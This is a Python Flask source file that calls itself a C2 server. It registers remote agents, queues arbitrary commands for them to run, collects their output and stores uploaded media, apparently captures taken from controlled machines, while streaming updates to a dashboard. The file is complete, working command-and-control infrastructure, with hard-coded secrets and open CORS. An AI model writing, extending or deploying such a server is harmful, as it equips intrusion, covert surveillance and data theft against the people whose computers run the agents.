from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import sqlite3
import datetime
import os
import base64

app = Flask(__name__)

# --------------------- SECURITY ---------------------
app.config['SECRET_KEY'] = 'fanky_socket_secret_2026_x9a'

API_KEY = "fanky_super_secret_key_2026"

socketio = SocketIO(app, cors_allowed_origins="*")

def check_api_key(req):
    api_key = req.headers.get("X-API-KEY")
    return api_key == API_KEY

# --------------------- DATABASE ---------------------
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()

    c.execute('''
        CREATE TABLE IF NOT EXISTS agents (
            id TEXT PRIMARY KEY,
            last_seen TIMESTAMP,
            status TEXT
        )
    ''')

    c.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            command TEXT,
            status TEXT,
            output TEXT,
            created_at TIMESTAMP,
            executed_at TIMESTAMP
        )
    ''')

    c.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            log TEXT,
            timestamp TIMESTAMP
        )
    ''')

    c.execute('''
        CREATE TABLE IF NOT EXISTS media (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            type TEXT,
            data TEXT,
            timestamp TIMESTAMP
        )
    ''')

    conn.commit()
    conn.close()

# --------------------- LOGGING ---------------------
def log_event(agent_id, log):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()

    c.execute(
        "INSERT INTO logs (agent_id, log, timestamp) VALUES (?, ?, ?)",
        (agent_id, log, datetime.datetime.now())
    )

    conn.commit()
    conn.close()

    socketio.emit('log_update', {
        'agent_id': agent_id,
        'log': log
    })

# --------------------- WEB ---------------------
@app.route('/')
def index():
    return render_template('dashboard.html')

# --------------------- API ---------------------

@app.route('/api/agents', methods=['GET'])
def get_agents():

    if not check_api_key(request):
        return jsonify({'error': 'Unauthorized'}), 401

    conn = sqlite3.connect('database.db')
    c = conn.cursor()

    c.execute(
        "SELECT id, last_seen, status FROM agents ORDER BY last_seen DESC"
    )

    agents = [
        {
            'id': row[0],
            'last_seen': row[1],
            'status': row[2]
        }
        for row in c.fetchall()
    ]

    conn.close()

    return jsonify(agents)

@app.route('/api/agents/register', methods=['POST'])
def register_agent():

    if not check_api_key(request):
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.json
    agent_id = data.get('agent_id')

    conn = sqlite3.connect('database.db')
    c = conn.cursor()

    c.execute(
        "INSERT OR REPLACE INTO agents (id, last_seen, status) VALUES (?, ?, ?)",
        (
            agent_id,
            datetime.datetime.now(),
            'online'
        )
    )

    conn.commit()
    conn.close()

    log_event(agent_id, "Agent registered")

    socketio.emit('agent_update', {
        'agent_id': agent_id,
        'status': 'online'
    })

    return jsonify({'status': 'ok'})

@app.route('/api/commands/pending/<agent_id>', methods=['GET'])
def get_pending_commands(agent_id):

    if not check_api_key(request):
        return jsonify({'error': 'Unauthorized'}), 401

    conn = sqlite3.connect('database.db')
    c = conn.cursor()

    c.execute(
        "UPDATE agents SET last_seen=?, status=? WHERE id=?",
        (
            datetime.datetime.now(),
            'online',
            agent_id
        )
    )

    c.execute(
        "SELECT id, command FROM commands WHERE agent_id=? AND status='pending' ORDER BY id ASC",
        (agent_id,)
    )

    commands = [
        {
            'id': row[0],
            'command': row[1]
        }
        for row in c.fetchall()
    ]

    conn.commit()
    conn.close()

    return jsonify(commands)

@app.route('/api/commands/submit', methods=['POST'])
def submit_command():

    if not check_api_key(request):
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.json

    agent_id = data.get('agent_id')
    command = data.get('command')

    conn = sqlite3.connect('database.db')
    c = conn.cursor()

    c.execute(
        "INSERT INTO commands (agent_id, command, status, created_at) VALUES (?, ?, ?, ?)",
        (
            agent_id,
            command,
            'pending',
            datetime.datetime.now()
        )
    )

    cmd_id = c.lastrowid

    conn.commit()
    conn.close()

    log_event(agent_id, f"Command submitted: {command}")

    socketio.emit('command_update', {
        'agent_id': agent_id,
        'command': command,
        'cmd_id': cmd_id
    })

    return jsonify({
        'status': 'ok',
        'command_id': cmd_id
    })

@app.route('/api/commands/result', methods=['POST'])
def command_result():

    if not check_api_key(request):
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.json

    command_id = data.get('command_id')
    output = data.get('output')

    conn = sqlite3.connect('database.db')
    c = conn.cursor()

    c.execute(
        "UPDATE commands SET status='executed', output=?, executed_at=? WHERE id=?",
        (
            output,
            datetime.datetime.now(),
            command_id
        )
    )

    c.execute(
        "SELECT agent_id, command FROM commands WHERE id=?",
        (command_id,)
    )

    row = c.fetchone()

    conn.commit()
    conn.close()

    if row:
        log_event(
            row[0],
            f"Command '{row[1]}' output: {output[:200]}"
        )

        socketio.emit('command_result', {
            'agent_id': row[0],
            'command': row[1],
            'output': output
        })

    return jsonify({'status': 'ok'})

@app.route('/api/media/upload', methods=['POST'])
def upload_media():

    if not check_api_key(request):
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.json

    agent_id = data.get('agent_id')
    media_type = data.get('type')
    media_data = data.get('data')

    conn = sqlite3.connect('database.db')
    c = conn.cursor()

    c.execute(
        "INSERT INTO media (agent_id, type, data, timestamp) VALUES (?, ?, ?, ?)",
        (
            agent_id,
            media_type,
            media_data,
            datetime.datetime.now()
        )
    )

    conn.commit()
    conn.close()

    socketio.emit('media_update', {
        'agent_id': agent_id,
        'type': media_type
    })

    return jsonify({'status': 'ok'})

@app.route('/api/media/<agent_id>/<type>', methods=['GET'])
def get_media(agent_id, type):

    if not check_api_key(request):
        return jsonify({'error': 'Unauthorized'}), 401

    conn = sqlite3.connect('database.db')
    c = conn.cursor()

    c.execute(
        "SELECT data, timestamp FROM media WHERE agent_id=? AND type=? ORDER BY timestamp DESC LIMIT 1",
        (
            agent_id,
            type
        )
    )

    row = c.fetchone()

    conn.close()

    if row:
        return jsonify({
            'data': row[0],
            'timestamp': row[1]
        })

    return jsonify({'data': None})

@app.route('/api/logs/<agent_id>', methods=['GET'])
def get_logs(agent_id):

    if not check_api_key(request):
        return jsonify({'error': 'Unauthorized'}), 401

    conn = sqlite3.connect('database.db')
    c = conn.cursor()

    c.execute(
        "SELECT log, timestamp FROM logs WHERE agent_id=? ORDER BY timestamp DESC LIMIT 50",
        (agent_id,)
    )

    logs = [
        {
            'log': row[0],
            'timestamp': row[1]
        }
        for row in c.fetchall()
    ]

    conn.close()

    return jsonify(logs)

# --------------------- START SERVER ---------------------
if __name__ == '__main__':

    init_db()

    print("[+] C2 Server started at http://0.0.0.0:8080")

    socketio.run(
        app,
        host='0.0.0.0',
        port=8080,
        debug=False,
        allow_unsafe_werkzeug=True
    )
